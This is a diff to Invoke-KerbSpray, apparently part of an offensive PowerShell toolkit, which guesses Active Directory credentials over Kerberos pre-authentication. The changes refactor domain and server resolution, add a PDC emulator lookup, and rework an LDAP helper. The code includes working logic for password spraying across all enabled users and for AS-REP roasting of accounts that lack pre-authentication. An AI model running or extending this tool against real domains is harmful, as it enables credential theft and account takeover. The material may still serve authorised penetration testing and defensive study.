@@ -1,7 +1,7 @@
 function Invoke-KerbSpray {
 <#
 .SYNOPSIS
-    Guess Active Directory credentials via Kerberos pre-authentication.
+    Guess Active Directory credentials via Kerberos preauthentication.
 
     Author: Timothee MENOCHET (@TiM0)
 
@@ -142,16 +142,40 @@ function Invoke-KerbSpray {
         $Neo4jPort = 7474
     )
 
-    if ($Domain -and -not $Server) {
-        $Server = [Net.Dns]::GetHostAddresses($Domain) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -First 1 -ExpandProperty IPAddressToString
+    if (-not ($Domain -or $Server)) {
+        try {
+            $Domain = $Env:USERDNSDOMAIN
+        }
+        catch {
+            Write-Error "Domain or Server parameter must be specified" -ErrorAction Stop
+        }
     }
-    elseif ($Server -and -not $Domain) {
+
+    if ($Server) {
+        try {
+            [System.Net.IPAddress]::Parse($Server) | Out-Null
+        }
+        catch {
+            $Server = (Resolve-DnsName -Name $Server -Verbose:$false).IPAddress | Select-Object -First 1
+        }
+    }
+    else {
+        $Server = (Resolve-DnsName -Name $Domain -Verbose:$false).IPAddress | Select-Object -First 1
+    }
+
+    if ($Domain) {
+        $rootDN = "DC=$Domain" -replace '\.',',DC='
+    }
+    else {
         $searchString = "LDAP://$Server/RootDSE"
         $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
-        $Domain = $domainObject.rootDomainNamingContext[0] -replace 'DC=' -replace ',','.'
+        $rootDN = $domainObject.rootDomainNamingContext[0]
+        $Domain = $rootDN -replace 'DC=' -replace ',','.'
     }
-    elseif (-not $Domain -and -not $Server) {
-        Write-Error "Domain or Server parameter must be specified" -ErrorAction Stop
+
+    if ($Ldap) {
+        $PDCe = (Resolve-DnsName -Server $Server -Name "_ldap._tcp.pdc._msdcs.$Domain" -Type SRV -Verbose:$false).IPAddress | Select-Object -First 1
+        $ADSpath = "LDAP://$PDCe/$rootDN"
     }
 
     if($Hash -like "*:*") {
@@ -163,7 +187,7 @@ function Invoke-KerbSpray {
     if ($Username) {
         if ($Ldap) {
             $filter = "(samAccountName=$Username)"
-            $user = Get-LdapObject -Filter $filter -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+            $user = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
             if ($user) {
                 $badPwdCount = $user.badPwdCount
             }
@@ -181,7 +205,7 @@ function Invoke-KerbSpray {
         ForEach ($username in Get-Content $UserFilePath) {
             if ($Ldap) {
                 $filter = "(samAccountName=$username)"
-                $user = Get-LdapObject -Filter $filter -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+                $user = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
                 if ($user) {
                     $badPwdCount = $user.badPwdCount
                 }
@@ -219,15 +243,15 @@ function Invoke-KerbSpray {
         if (-not ($Password -or $Hash)) {
             # Find enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
-            $users = Get-LdapObject -Filter $filter -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
         }
         else {
             # Find all enabled users (spraying)
             $filter = "(&(samAccountType=805306368)$filter)"
-            $users = Get-LdapObject -Filter $filter -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+            $users = Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
         }
         ForEach ($user in $users) {
-            if ($user.badPwdCount -le $Limit) {
+            if (($user.badPwdCount -le $Limit) -or -not ($Password -or $Hash)) {
                 $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
@@ -307,7 +331,7 @@ function Invoke-KerbSpray {
                 $newBadPwdCount = $null
                 if ($Ldap) {
                     $filter = "(samAccountName=$($cred.Username))"
-                    $newBadPwdCount = (Get-LdapObject -Filter $filter -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+                    $newBadPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
                 }
                 if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
                         Write-Host "[+] $($cred.Username)@$($Domain) failed to authenticate" -NoNewline
@@ -399,13 +423,10 @@ function Invoke-KerbSpray {
 
 function Local:Get-LdapObject {
     Param (
+        [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $Identity,
-
-        [ValidateNotNullOrEmpty()]
-        [String[]]
-        $Properties = "*",
+        $ADSpath,
 
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
@@ -416,11 +437,6 @@ function Local:Get-LdapObject {
         [Int]
         $PageSize = 200,
 
-        [Parameter(Mandatory=$true)]
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Server,
-
         [String]
         $LdapUser,
 
@@ -428,22 +444,17 @@ function Local:Get-LdapObject {
         $LdapPass
     )
 
-    $searchString = "LDAP://$Server/RootDSE"
-    $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
-    $rootDN = $domainObject.rootDomainNamingContext[0]
-    $searchString = "LDAP://$Server/$rootDN"
     if ($LdapUser) {
-        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $LdapUser, $LdapPass)
+        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($ADSpath, $LdapUser, $LdapPass)
         $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
     }
     else {
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
     }
     $searcher.PageSize = $PageSize
     $searcher.CacheResults = $false
     $searcher.filter = $Filter
-    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
-    $searcher.PropertiesToLoad.AddRange(($propertiesToLoad)) | Out-Null
+    $searcher.PropertiesToLoad.Add('*') | Out-Null
     Try {
         $results = $searcher.FindAll()
         $results | Where-Object {$_} | ForEach-Object {
